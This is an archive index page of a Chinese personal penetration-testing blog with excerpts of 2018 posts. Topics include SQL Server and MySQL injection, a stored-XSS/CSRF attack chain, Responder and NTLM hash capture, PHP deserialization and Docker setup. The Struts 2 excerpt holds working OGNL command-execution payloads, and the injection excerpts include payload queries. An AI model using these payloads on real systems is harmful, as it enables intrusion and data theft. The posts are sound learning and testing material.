
<!DOCTYPE html>
<html lang="en">
<head>
	<meta name="generator" content="Hugo 0.55.0" />
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reber's Blog - 渗透测试|python|php </title>
    <meta name="keywords" content="渗透测试,web安全,漏洞,python,php,linux">
    <meta name="description" content="我的个人博客，主要用于记录自己的一些学习笔记之类的东西，其中有渗透测试、python、php等。">
    <meta name="author" content="reber">
    <link rel="stylesheet" type="text/css" href="/css/pure-min.css">
    <!--[if lte IE 8]>
    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-old-ie-min.css">
    <![endif]-->
    <!--[if gt IE 8]><!-->
    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-min.css">
    <!--<![endif]-->
    <link rel="stylesheet" type="text/css" href="/css/style.css">
    <link rel="stylesheet" type="text/css" href="/css/font-awesome.min.css">
    <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.ico" />
    <link rel="alternate" type="application/rss+xml" title="Reber&#39;s Blog" href="/index.xml" />
    <link rel="stylesheet" href="/css/monokai-sublime.css" type="text/css">
    <script src="/js/highlight.min.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>
    <script src="/js/jquery.min.js"></script>
</head>
<body>

<div class="reber">
    
<div class="head">
    <h1 class="logo" id="logo">
        <a href="/"><img src='/img/logo.png' width='70px'></a>
    </h1>
    <ul class="nav">
        
            
                <li>
                    <a href="/"><i class='fa fa-home fa-fw'></i>Home</a>
            
                </li>
        
            
                <li>
                    <a href="/posts/"><i class='fa fa-list fa-fw'></i>Archive</a>
            
                </li>
        
            
                <li>
                    <a href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
            
                </li>
        
    </ul>
</div>


    
<div class="main">
    <div class="left">
        <div class="content">
            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/">记一次SQL Server报错注入</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    
                        2018-12-24
                    
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 验证码前端验证 需要测试一个网站，刚开始看到网站时感觉希望不大，因为验证码是需要拖动的，这也就意味着很大可能没办法爆破，另一方面是都用这种验证码了，安全做的能很差劲吗？果然，试了admin、123456之类的都不行 那就抓个包吧 emmmmmm。 32位，md5加密？这里看着没有验证码之类的信息，把这个包发了几次发现没有出现验证码信息，而且试了试，发现有两种状态(运气比较好，有admin这个用户，我也是试的这个用户，一下子就看出返回不同了)，如下：
用户不存在时返回 {&quot;iserror&quot;:true,&quot;message&quot;:&quot;用户名不存在！&quot;,&quot;data&quot;:null,&quot;errorfieldlist&quot;:null}
用户名存在时返回 {&quot;iserror&quot;:true,&quot;message&quot;:&quot;密码不正确！&quot;,&quot;data&quot;:null,&quot;errorfieldlist&quot;:null}
可以的，验证码前端验证，我觉得可以burp抓包intruder一下
跑了top 500的用户名和top 1000的密码，除了直接试的用户名admin，其他的一个都没有跑出来 sad
0x01 存在注入 嗯看来爆破是基本没有希望了，测其他的吧，嗯，这里是登陆，那肯定要看注入的，无脑加单引号，boom！ 可以的，and 1=1 有注入
哎？？！！！那不对啊，咋的后台还解密md5后进行查询？？
刚才看了数据包，用户名密码都是32位，猜想sql语句是：select password from user where username=name_md5_hash，然后判断用户存不存在之类的
看返回信息的话显然不是啊，哪有后台解密md5后查询的。。。。。。
试试post其他用户名和密码，然后看数据包 显然并不是md5。。。。 这个是前端加密后发送的。。。。。看一下js，结果发现了这个 emmmmm，想了想，应该可以注入的，看看啥系统 大概率SQL Server了(因为前几天在t00ls刚看到了一个ASP.NET+MySQL，比较任性)，所以这里看一下，发现确实是SQL Server 看看数据库版本，嗯，看来还是报错注入 可以可以，看看有几列，然后进行union注入 一列，这里也能大致猜出来sql语句了，估计就是：select password from user where username='admin'
那就看看数据库吧，不知道SQL Server中的concat怎么用，一个个来吧。。。。
得到第一个数据库的名字：union select name from master.dbo.sysdatabases where dbid=1 得到第二个数据库的名字：union select name from master.dbo.sysdatabases where dbid=2 得到第5个数据库的名字：union select name from master.dbo.sysdatabases where dbid=5 好麻烦啊，拖一下验证码，然后得到一个数据库，而且后面还有表呢。。。。。
py一下了吧，前端有js进行加密，可以本地写文件生成加密后的payload，然后python拿到payload后进行注入
    </p>

    
    <footer>
        <a href="/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/2018/docker-compose-build-lamp/">使用docker-compose构造LAMP环境</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    
                        2018-12-15
                    
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/linux">Linux</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/docker">docker</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 实现功能 使用docker-compose构造LAMP环境，其中mysql数据库、mysql配置文件、网站文件均持久化存储到本机。
apache、php通过Dockerfile构造，Dockerfile拉取ubuntu镜像，然后安装apache2和php。
mysql的话通过docker的links连接mysql:5.5这个镜像当作数据库。
具体文件参见：https://github.com/reber0/docker_env
0x01 文件构造 ➜ tree apache apache ├── Dockerfile ├── conf │ └── my.cnf ├── docker-compose.yml ├── mysql ├── src │ ├── init.sh │ └── sources.list └── web └── index.php 4 directories, 6 files  0x02 docker-compose.yml version: '3' services: apache: image: ubuntu:apache #镜像名为ubuntu，tag为apache container_name: apache #运行后生成的容器名字为apache build: . #使用当前路径下的Dockerfile构造镜像 ports: - &quot;81:80&quot; volumes: - ./www:/var/www/html links: - mymysql environment: #设置环境变量 - TZ=Asia/Shanghai #设定时区 restart: always #容器重启策略：当容器终止退出后，总是重启容器，默认策略。 mymysql: image: mysql:5.
    </p>

    
    <footer>
        <a href="/posts/2018/docker-compose-build-lamp/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/2018/docker-compose/">Docker之Docker Compose</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    
                        2018-11-19
                    
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/linux">Linux</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/docker">docker</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 关于docker compose 可以把docker-compose当作docker命令的封装，它是一个用来把 docker 自动化的东西，docker-compose可以一次性管理多个容器，通常用于需要多个容器相互配合来完成某项任务的场景。
0x01 安装与卸载 https://docs.docker.com/compose/install
0x02 一些常用命令  构建容器：docker-compose up -d 启动容器：docker-compose start 停止容器：docker-compose stop 重启容器：docker-compose restart kill容器：docker-compose kill 删除容器：docker-compose rm bash连接容器：docker-compose exec [services_name] bash 执行一条命令：docker-compose run [services_name] [command]  0x03 docker-compose简单应用  结构
. ├── Dockerfile ├── docker-compose.yml └── src ├── app.py └── sources.list 1 directory, 4 files  Dockerfile
FROM ubuntu:14.04.4 MAINTAINER reber &lt;1070018473@qq.com&gt; COPY ./src /code #将data挂载到容器的code WORKDIR /code RUN cp sources.list /etc/apt/sources.
    </p>

    
    <footer>
        <a href="/posts/2018/docker-compose/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/2018/recording-an-xss-in-pentest/">记一次渗透测试中利用存储型XSS添加用户</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    
                        2018-11-14
                    
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/xss">xss</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 简单查看 拿到目标后简单看了下，是一个类似员工管理的东西，用户可以创建group，其他用户可以搜索这个group然后申请加入
每个账号都可以注册组织，然后让别人加入，加入的用户有创建者、管理员、默认成员3个角色，管理员拥有的权限就比较大了，可以查看通讯录、添加成员、删除成员等等
0x01 申请加入组织流程分析 走了一遍流程，注册了两个账号，一个是reber，一个是yxk
在加入某组织时会让填验证信息，组织收到申请后同意然后把用户添加到某个分组然后确定
流程大概分4步，用户申请加入group、管理员点击同意、管理员关联用户到分组或成员、确定同意用户的申请
 用户reber搜索组织，然后提交验证消息  用户yxk在消息列表同意reber的申请  yxk给reber分组，点击下一步
 最后一步写入备注信息，点击同意按钮最终同意用户加入   0x02 请求链接分析 经过对上面流程的抓包分析测试，涉及到的有用请求有3个：管理员点击同意链接时的请求、关联到分组或成员的请求、确定同意的请求
 用户申请加入某group时发送的数据包如下：  API：/a/cms/org/applyorg POST：verification=11111&amp;orgId=247173   group管理员同意用户申请时链接如下：  API：/a/cms/apply/handle-accept?id=6de027c0-9a4f-490e-a5e2-d1c76cd34a70&amp;oid=247178&amp;name=1760048****  这里链接里有一个id，经过抓包发现可以通过/a/cms/apply/applymsg这个接口直接得到同意申请时的链接
 将申请用户关联到分组或成员涉及到如下数据包：  API：/a/cms/apply/do.handle POST：ID=80b49e8f-4e8c-450f-8bf4-eb809271e779&amp;OID=247178&amp;GID=608863&amp;MID=0&amp;Agree=true&amp;Reason=111  可以看到，上面的请求链接中都没有token，存在CSRF，就猜想能不能构造上述请求从而通过XSS和CSRF来做一些事情
0x03 构造直接添加用户到group的js 由于cookie设置了httponly，不能获取到完整的cookie，所以这里尝试写js代码，实现将用户直接加入group的功能
看了上面的请求包分析后发现，如果要构造数据包实现我们的想法的话需要有：ID、OID、GID这3个id
分析后发现在/a/cms/apply/applymsg请求的返回包中有同意的链接，链接中有ID
分析后发现在/a/cms/group/treeNode请求的返回包中有OID和GID
于是用于XSS的1.js内容构造如下：
//因为这里要把ajax的返回值return到函数中，需要是同步请求，所以async要设为false function get_agree_url(){//得到管理员同意用户申请的链接 var agree_url; var href; $.ajax({ type: 'get', url: '/a/cms/apply/applymsg', async: false, success: function(data){ $(data).find('#accept').each(function(index,element){ href = $(this).attr('href'); if (/id=.
    </p>

    
    <footer>
        <a href="/posts/2018/recording-an-xss-in-pentest/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/2018/responder-and-ntml-hash/">内网渗透之Responder与Net-NTML hash</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    
                        2018-09-10
                    
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/intranet">intranet</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 一些概念  Windows认证协议
分为：基于NTML的认证和基于kerberos的认证
 什么是NTLM Hash？
早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即NTLM Hash
 什么是Challenge-Response挑战/响应验证机制？
 Client输入username、password、domain，然后将用户名及密码hash后存在本地，并将username发送到 DC DC生成一个16字节的随机数，即Challenge(挑战码)，然后传回Client Client收到Challenge后将密码hash和challenge混合hash，混合后的hash称为response，然后将challenge、response和username发送给Server Server将收到的3个值转发给DC，然后DC根据传过来的username到域控的账号数据库ntds.list找到对应的密码hash，将hash和Client传过来的challenge混合hash，将这个混合hash与Client传过来的response进行对比验证  NTLM Hash与Net-NTLM Hash
 NTLM Hash通常是指Windows系统下Security Account Manager中保存的用户密码hash，通常可从Windows系统中的SAM文件和域控的NTDS.dit文件中获得所有用户的hash（比如用Mimikatz提取），“挑战/响应验证”中的用户名及密码hash就是NTLM Hash Net-NTLM Hash通常是指网络环境下NTLM认证中的hash，“挑战/响应验证”中的response中包含Net-NTLM hash，用Responder抓取的就是Net-NTLM Hash  关于Responder
由Laurent Gaffie撰写的 Responder 是迄今为止，在每个渗透测试人员用于窃取不同形式的证书（包括Net-NTLM hash）的最受欢迎的工具。它通过设置几个模拟的恶意守护进程（如SQL服务器，FTP，HTTP和SMB服务器等）来直接提示凭据或模拟质询 – 响应验证过程并捕获客户端发送的必要 hash。Responder也有能力攻击LLMNR，NBT-NS和mDNS等协议。
 什么是NTLM中继攻击？
攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。
  0x01 软件环境  可以从https://github.com/lgandx/Responder下载Responder 域内主机：Win7（10.11.11.20） 域控主机：Win2008（10.11.11.18） 被控主机：Ubuntu14.04（10.11.11.11）和目标机同一网段  0x02 通过SMB服务获取Net-NTLM hash 对于SMB协议，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录，所以可以模拟SMB服务器从而截获hash，执行如下命令都可以得到hash
net.exe use \\host\share attrib.exe \\host\share bcdboot.exe \\host\share bdeunlock.
    </p>

    
    <footer>
        <a href="/posts/2018/responder-and-ntml-hash/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/2018/injection-tips-of-sqlserver/">SQL注入tips(SQL Server)</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    
                        2018-09-04
                    
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 基础信息探测 @@VERSION,@@SERVERNAME,@@SERVICENAME; --Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) --WIN-2008 --MSSQLSERVER USER,CURRENT_USER,SESSION_USER,SYSTEM_USER; --dbo --dbo --dbo --sa USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME(); --dbo --wyb --46530 --sa USER_ID(),USER_SID(); --1 --&lt;01&gt; ORIGINAL_LOGIN(); --sa  0x01 UNION query &amp; error-based 注入  判断存在注入  and 1=1/and 1=2  select * from msg where id=1 and 11=(select case when(1=1) then 11 else 2 end); select * from msg where id=1 and 11=(select case when(1=2) then 11 else 2 end);   判断是否为sa权限  select name from msg where id=1 and 1=convert(int,(select is_srvrolemember('sysadmin')));   得到所有数据库名字 --报错得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库 select id,name from msg where id=1 and 0&lt;&gt;(select name from master.
    </p>

    
    <footer>
        <a href="/posts/2018/injection-tips-of-sqlserver/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/2018/php-session-deserialize/">关于 PHP SESSION 反序列化</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    
                        2018-07-23
                    
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/php">php</a>&nbsp;&#47;
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/deserialize">deserialize</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 环境 公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。
其中有一道是php反序列化，直接用的就是 第三届4.29“安恒杯”网络安全技术大赛初赛第三个web题
我比较菜，这里根据网上已有writeup做了一遍，这里记录一下。。。。
reber@wyb:~$ html cat /proc/version Linux version 4.4.0-31-generic (buildd@lgw01-43) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016 reber@wyb:~$ html php --version PHP 5.5.9-1ubuntu4.21 (cli) (built: Feb 9 2017 20:54:58) Copyright (c) 1997-2014 The PHP Group Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies reber@ubuntu-linux:~$ apachectl -v Server version: Apache/2.
    </p>

    
    <footer>
        <a href="/posts/2018/php-session-deserialize/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/2018/structs2-some-vulnerability-payload/">Struts 2相关漏洞payload</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    
                        2018-06-25
                    
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/rce">rce</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 S2-001 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。  %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;whoami&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}  0x01 S2-005 影响版本: 2.0.0 - 2.1.8.1
http://aa.com/index.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1  0x02 S2-007 影响版本: 2.0.0 - 2.2.3
当配置了验证规则 &lt;ActionName&gt;-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。  ' + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '  0x03 S2-012 影响版本: 2.1.0 - 2.3.13
这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。  %{#a=(new java.lang.ProcessBuilder(new java.
    </p>

    
    <footer>
        <a href="/posts/2018/structs2-some-vulnerability-payload/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/2018/injection-tips-of-mysql/">SQL注入tips(MySQL)</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    
                        2018-05-23
                    
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        环境：MySQL 5.5.47
0x00 注入点在Order by后面 mysql&gt; select id,name,content from msg where id&gt;1 order by id into outfile 'C:\\Apps\\phpStudy\\WWW\\a.txt'; Query OK, 1 row affected (0.01 sec)  mysql&gt; select id,name,content from msg where id&gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1); ERROR 1105 (HY000): XPATH syntax error: '~msg~'  mysql&gt; select id,name,content from msg where id&gt;1 order by name procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1); ERROR 1105 (HY000): XPATH syntax error: '~rtest~'  mysql&gt; select name from msg where id&gt;1 order by if(1=1,1,(select 1 union select 2)); +----------+ | name | +----------+ | xiaohong | +----------+ 1 row in set (0.
    </p>

    
    <footer>
        <a href="/posts/2018/injection-tips-of-mysql/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


            
                
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/2018/thinkphp5-where-function/">ThinkPHP5的where函数</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    
                        2018-04-16
                    
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>&nbsp;&#47;
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/php">PHP</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 关于thinkphp5的where函数 年前公司委托别的公司开发一个网站，使用的是ThinkPHP 5.0.13，存在一个注入漏洞，分析后发现是因为tp5中的where函数使用不当，tp5中where这个函数可以接收字符串和数组这两种类型的参数来进行查询，而在用字符串这种传递方式时，如果使用不当的话就可能会出现sql注入。
0x01 示例代码 tp5/application/home/controller/Index.php
&lt;?php namespace app\home\controller; use think\Db; class Index { //http://127.0.0.1/Source/tp5/home/index/testdb/id/1 public function testDb() { // 调用 tp5/thinkphp/library/think/Db.php 的 connect() 函数 初始化数据库，并取得数据库类实例 $msg = db('msg'); $id = input('param.id',1); //不存在id的话默认为1 //在Db.php中use think\db\Query; $msg-&gt;where()则调用了Query.php中的where函数进入查询流程 $result = $msg-&gt;where(&quot;id=&quot;.$id)-&gt;select(); // $result = $msg-&gt;where(['id'=&gt;$id])-&gt;select(); echo '&lt;br/&gt;&lt;hr/&gt;执行的sql语句：'; echo $msg-&gt;getLastSql(); echo '&lt;br/&gt;最终得到的结果：'; echo var_dump($result); } }  where函数接收字符串和数组时，访问http://127.0.0.1/Source/tp5/home/index/testdb/id/1执行的SQL语句分别如下：
SELECT * FROM `msg` WHERE ( id=1 ) SELECT * FROM `msg` WHERE `id` = 1  前者存在注入，当payload为: ) and 1=1 and (1)=(1时判断返回如下： 主要调用文件及函数顺序如下：
    </p>

    
    <footer>
        <a href="/posts/2018/thinkphp5-where-function/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


            

            


    
    
    <nav class="pagination" role="pagination">
        
            <a href="/"><i class="fa fa-chevron-left"></i></a>
        

        <span>&nbsp;2 / 19&nbsp;</span>
        
        
            <a href="/page/3/"><i class="fa fa-chevron-right"></i></a>
        
    </nav>


        </div>
    </div>
    <div class="right">
        

<div style="padding-bottom:10px;">


    <h2 class="asidetitle">Categorie<a href="/single.html" class="single">s</a></h2>
    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="http://wyb0.com/topics/database" title="database">database(12)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="http://wyb0.com/topics/git" title="git">git(6)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="http://wyb0.com/topics/javascript" title="javascript">javascript(4)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="http://wyb0.com/topics/linux" title="linux">linux(26)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="http://wyb0.com/topics/other" title="other">other(14)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="http://wyb0.com/topics/pentest" title="pentest">pentest(80)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="http://wyb0.com/topics/php" title="php">php(12)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="http://wyb0.com/topics/python" title="python">python(35)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="http://wyb0.com/topics/server" title="server">server(10)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="http://wyb0.com/topics/windows" title="windows">windows(4)</a>
            </li>
        
    </ul>


</div>
        

<div style="padding-bottom:10px;">


    <h2 class="asidetitle">Tags</h2>
    <div class="taglist" id="tags">
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/ajax" title="ajax">ajax</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/backdoor" title="backdoor">backdoor</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/cgi" title="cgi">cgi</a>
